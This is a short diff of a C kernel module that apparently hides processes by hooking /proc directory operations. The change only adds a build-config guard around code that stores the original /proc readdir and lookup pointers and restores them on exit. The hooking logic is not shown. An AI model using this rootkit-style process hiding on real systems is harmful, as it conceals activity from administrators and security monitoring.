@@ -10,6 +10,8 @@
 #include <linux/path.h> // For kern_path and d_drop
 #include "version_control.h"
 
+#ifdef CONFIG_HIDE_PROC_MODE
+
 // --- Original function pointers storage ---
 static int (*original_proc_root_readdir)(struct file *, struct dir_context *);
 static struct dentry * (*original_proc_root_lookup)(struct inode *, struct dentry *, unsigned int);
@@ -248,3 +250,4 @@ void hide_proc_exit(void) {
     clear_hidden_pids();
     PRINT_DEBUG("[hide_proc] Restored /proc operations.\n");
 }
+#endif
